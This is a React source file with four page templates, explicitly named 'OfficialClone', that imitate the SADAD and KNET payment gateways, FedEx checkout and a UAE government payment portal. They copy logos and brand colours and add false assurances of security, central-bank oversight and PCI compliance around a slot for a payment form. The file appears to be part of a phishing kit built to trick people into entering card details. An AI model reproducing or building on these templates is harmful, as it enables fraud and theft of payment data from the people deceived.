import React from 'react';
import { Card } from '@/components/ui/card';
import { Shield, Lock, Globe, CreditCard, ChevronLeft, CheckCircle2 } from 'lucide-react';

interface CloneProps {
  children: React.ReactNode;
  amount?: string;
  serviceName?: string;
  trackingNumber?: string;
}

export const SADADOfficialClone: React.FC<CloneProps> = ({ children, amount, serviceName }) => {
  return (
    <div className="min-h-screen bg-[#F7F7F7] font-sans" dir="rtl">
      {/* Official SADAD Header */}
      <nav className="bg-white border-b-4 border-[#F58220] px-6 py-4 flex items-center justify-between shadow-md">
        <div className="flex items-center gap-6">
          <img src="./assets/branding/logo-sadad.png" alt="SADAD" className="h-14" />
          <div className="hidden md:block">
            <h1 className="text-xl font-bold text-[#333]">نظام سداد للمدفوعات</h1>
            <p className="text-xs text-gray-500">SADAD Payment System</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <div className="flex items-center gap-2 text-green-600 font-bold text-sm bg-green-50 px-3 py-1 rounded-full border border-green-100">
            <Lock className="w-4 h-4" />
            <span>اتصال آمن</span>
          </div>
          <button className="text-sm font-bold text-[#F58220]">English</button>
        </div>
      </nav>

      {/* Main Payment Area */}
      <main className="container mx-auto px-4 py-10 max-w-4xl">
        <div className="bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-100">
          <div className="bg-[#F58220] p-8 text-white flex items-center justify-between">
            <div>
              <h2 className="text-2xl font-black mb-1">تفاصيل الفاتورة</h2>
              <p className="opacity-80 text-sm">يرجى مراجعة البيانات قبل إتمام الدفع</p>
            </div>
            {amount && (
              <div className="bg-white/20 backdrop-blur-md px-8 py-4 rounded-2xl border border-white/30 text-center">
                <p className="text-xs opacity-70 mb-1">المبلغ الإجمالي</p>
                <p className="text-3xl font-black">{amount}</p>
              </div>
            )}
          </div>

          <div className="p-10">
            <div className="flex items-center gap-4 mb-8 pb-6 border-b border-gray-100">
              <div className="w-14 h-14 bg-orange-50 rounded-2xl flex items-center justify-center">
                <CreditCard className="w-8 h-8 text-[#F58220]" />
              </div>
              <div>
                <h3 className="text-lg font-bold text-gray-800">{serviceName || 'المدفوعات الحكومية'}</h3>
                <p className="text-sm text-gray-500">دفع عبر بوابة سداد الآمنة</p>
              </div>
            </div>

            {children}
          </div>
        </div>

        <div className="mt-10 grid grid-cols-3 gap-6">
          {[
            { icon: Shield, title: 'حماية معتمدة', desc: 'بإشراف البنك المركزي' },
            { icon: Lock, title: 'تشفير متقدم', desc: 'SSL 256-bit' },
            { icon: Globe, title: 'دعم وطني', desc: 'نظام المدفوعات الأول' }
          ].map((item, i) => (
            <div key={i} className="text-center p-6 bg-white rounded-2xl border border-gray-100 shadow-sm">
              <item.icon className="w-8 h-8 mx-auto mb-3 text-[#F58220]" />
              <h4 className="font-bold text-gray-800 mb-1">{item.title}</h4>
              <p className="text-[10px] text-gray-500 uppercase">{item.desc}</p>
            </div>
          ))}
        </div>
      </main>

      <footer className="py-10 text-center text-gray-400 text-xs">
        <div className="flex justify-center gap-6 mb-4">
          <a href="#" className="hover:text-[#F58220]">سياسة الخصوصية</a>
          <a href="#" className="hover:text-[#F58220]">اتفاقية الاستخدام</a>
          <a href="#" className="hover:text-[#F58220]">الأسئلة الشائعة</a>
        </div>
        <p>© 2025 نظام سداد للمدفوعات. جميع الحقوق محفوظة.</p>
      </footer>
    </div>
  );
};

export const KNETOfficialClone: React.FC<CloneProps> = ({ children, amount }) => {
  return (
    <div className="min-h-screen bg-[#F0F2F5] font-sans" dir="rtl">
      <header className="bg-white px-6 py-6 flex flex-col items-center justify-center border-b shadow-sm">
        <img src="./assets/branding/logo-knet.png" alt="KNET" className="h-16 mb-4" />
        <div className="w-full h-1 bg-gradient-to-r from-green-600 via-blue-600 to-red-600 rounded-full max-w-md" />
      </header>

      <main className="container mx-auto px-4 py-8 max-w-2xl">
        <div className="bg-white rounded-xl shadow-xl overflow-hidden">
          <div className="bg-[#007A33] p-6 text-white text-center">
            <h2 className="text-xl font-bold">بوابة الدفع الإلكتروني</h2>
            {amount && (
              <div className="mt-4 flex items-center justify-center gap-2">
                <span className="text-sm opacity-80">المبلغ:</span>
                <span className="text-3xl font-black">{amount}</span>
              </div>
            )}
          </div>

          <div className="p-8">
            {children}
          </div>
          
          <div className="bg-gray-50 p-6 flex items-center justify-center gap-8 border-t">
            <img src="./assets/branding/logo-knet.png" className="h-6 opacity-50" />
            <div className="h-6 w-px bg-gray-300" />
            <div className="flex items-center gap-2 text-gray-400 text-xs font-bold">
              <Lock className="w-4 h-4" />
              <span>SECURE PAYMENT</span>
            </div>
          </div>
        </div>
        
        <p className="text-center mt-6 text-[10px] text-gray-400 leading-relaxed max-w-lg mx-auto">
          بإتمامك لعملية الدفع، أنت توافق على شروط وأحكام كي نت والبنك المصدر للبطاقة. 
          يتم تشفير كافة البيانات لضمان أقصى درجات الأمان.
        </p>
      </main>
    </div>
  );
};

export const FedExOfficialClone: React.FC<CloneProps> = ({ children, amount, trackingNumber }) => {
  return (
    <div className="min-h-screen bg-white font-sans text-[#333]" dir="rtl">
      {/* FedEx Global Header */}
      <header className="bg-[#4D148C] px-6 h-20 flex items-center justify-between sticky top-0 z-50">
        <div className="flex items-center gap-10">
          <img src="./assets/branding/logo-fedex.png" alt="FedEx" className="h-10" />
          <nav className="hidden lg:flex items-center gap-6 text-white font-bold text-sm">
            <button className="hover:text-[#FF6600]">الشحن</button>
            <button className="hover:text-[#FF6600]">التتبع</button>
            <button className="hover:text-[#FF6600]">الدعم</button>
          </nav>
        </div>
        <div className="flex items-center gap-4 text-white">
          <button className="text-sm font-bold bg-[#FF6600] px-6 py-2 rounded-full">تسجيل الدخول</button>
          <Globe className="w-5 h-5 cursor-pointer" />
        </div>
      </header>

      {/* FedEx Checkout Header */}
      <div className="bg-[#FAFAFA] border-b px-6 py-8">
        <div className="container mx-auto flex flex-col md:flex-row md:items-center justify-between gap-6">
          <div>
            <h1 className="text-3xl font-black text-[#4D148C] mb-2">إكمال عملية الشحن</h1>
            <p className="text-gray-500 font-bold flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-green-500" />
              حالة الشحنة: بانتظار الدفع
            </p>
          </div>
          <div className="flex items-center gap-4">
            <div className="bg-white p-4 rounded-xl border shadow-sm text-center min-w-[150px]">
              <p className="text-[10px] text-gray-400 font-bold uppercase mb-1">رقم التتبع</p>
              <p className="font-black text-[#4D148C]">{trackingNumber || '8123 4567 8901'}</p>
            </div>
            <div className="bg-[#4D148C] p-4 rounded-xl shadow-lg text-white text-center min-w-[150px]">
              <p className="text-[10px] opacity-70 font-bold uppercase mb-1">إجمالي المطلوب</p>
              <p className="text-xl font-black">{amount}</p>
            </div>
          </div>
        </div>
      </div>

      <main className="container mx-auto px-4 py-12">
        <div className="grid lg:grid-cols-12 gap-12">
          <div className="lg:col-span-8">
            <div className="bg-white rounded-2xl border-2 border-gray-100 p-8 shadow-sm">
              <div className="flex items-center gap-3 mb-10 pb-4 border-b">
                <div className="w-12 h-12 bg-[#4D148C]/10 rounded-xl flex items-center justify-center">
                  <CreditCard className="w-6 h-6 text-[#4D148C]" />
                </div>
                <h2 className="text-2xl font-black">بيانات الدفع والتحقق</h2>
              </div>
              {children}
            </div>
          </div>

          <div className="lg:col-span-4 space-y-6">
            <div className="bg-[#FAFAFA] rounded-2xl p-6 border">
              <h3 className="font-black mb-4 flex items-center gap-2">
                <Lock className="w-5 h-5 text-[#4D148C]" />
                أمان فيديكس
              </h3>
              <p className="text-xs text-gray-500 leading-relaxed mb-6">
                نحن نستخدم أعلى بروتوكولات الأمان العالمية لحماية بياناتك. 
                فيديكس تضمن خصوصيتك وأمان تعاملاتك المالية.
              </p>
              <div className="space-y-4">
                <div className="flex items-center gap-3 text-xs font-bold">
                  <CheckCircle2 className="w-4 h-4 text-green-600" />
                  <span>تشفير SSL متقدم</span>
                </div>
                <div className="flex items-center gap-3 text-xs font-bold">
                  <CheckCircle2 className="w-4 h-4 text-green-600" />
                  <span>معايير PCI DSS العالمية</span>
                </div>
              </div>
            </div>

            <img src="./assets/branding/hero-fedex.jpg" className="rounded-2xl shadow-lg w-full" />
          </div>
        </div>
      </main>

      <footer className="bg-[#F8F8F8] border-t py-12 px-6">
        <div className="container mx-auto grid md:grid-cols-4 gap-10">
          <div>
            <img src="./assets/branding/logo-fedex.png" className="h-6 mb-6 opacity-30 grayscale" />
            <p className="text-[10px] text-gray-400">© 2025 FedEx. جميع الحقوق محفوظة.</p>
          </div>
          <div className="space-y-4">
            <h4 className="font-black text-sm">عن فيديكس</h4>
            <div className="flex flex-col gap-2 text-xs text-gray-500">
              <a href="#">قصتنا</a>
              <a href="#">وظائف</a>
              <a href="#">المستثمرون</a>
            </div>
          </div>
          <div className="space-y-4">
            <h4 className="font-black text-sm">خدمة العملاء</h4>
            <div className="flex flex-col gap-2 text-xs text-gray-500">
              <a href="#">اتصل بنا</a>
              <a href="#">الأسئلة الشائعة</a>
              <a href="#">المطالبات</a>
            </div>
          </div>
          <div className="space-y-4">
            <h4 className="font-black text-sm">القانونية</h4>
            <div className="flex flex-col gap-2 text-xs text-gray-500">
              <a href="#">الشروط والأحكام</a>
              <a href="#">سياسة الخصوصية</a>
              <a href="#">الامتثال</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export const JaywanOfficialClone: React.FC<CloneProps> = ({ children, amount, serviceName }) => {
  return (
    <div className="min-h-screen bg-[#FDFDFD] font-sans" dir="rtl">
      <header className="bg-white border-b px-6 py-4 flex items-center justify-between">
        <img src="./assets/branding/logo-uae-gov.png" alt="Jaywan" className="h-12" />
        <div className="flex gap-4 items-center">
          <div className="text-right">
            <p className="text-[10px] text-gray-400 font-bold uppercase">Government of UAE</p>
            <p className="text-xs font-bold text-gray-800">بوابة الدفع الذكي</p>
          </div>
          <div className="w-10 h-10 bg-gray-100 rounded-full flex items-center justify-center">
            <Globe className="w-5 h-5 text-gray-400" />
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-12 max-w-5xl">
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2 space-y-6">
            <div className="bg-white p-8 rounded-2xl shadow-sm border border-gray-100">
              <h2 className="text-2xl font-bold mb-6 text-gray-800 border-r-4 border-[#CE1126] pr-4">إكمال عملية الدفع</h2>
              {children}
            </div>
          </div>

          <div className="space-y-6">
            <div className="bg-[#1A1A1A] p-8 rounded-2xl text-white shadow-xl">
              <h3 className="text-sm font-bold opacity-60 mb-6 uppercase tracking-widest">ملخص العملية</h3>
              <div className="space-y-4">
                <div className="flex justify-between items-center">
                  <span className="opacity-70">الخدمة:</span>
                  <span className="font-bold">{serviceName || 'خدمات عامة'}</span>
                </div>
                <div className="flex justify-between items-center text-xl pt-4 border-t border-white/10">
                  <span className="font-black text-[#CE1126]">المجموع:</span>
                  <span className="font-black">{amount}</span>
                </div>
              </div>
            </div>

            <div className="bg-white p-6 rounded-2xl border border-gray-100 shadow-sm">
              <div className="flex items-center gap-3 mb-4">
                <Shield className="w-6 h-6 text-green-600" />
                <span className="font-bold text-gray-800">دفع آمن 100%</span>
              </div>
              <p className="text-xs text-gray-500 leading-relaxed">
                يتم معالجة جميع المعاملات من خلال بوابات دفع مشفرة ومتوافقة مع أعلى معايير الأمان العالمية.
              </p>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};
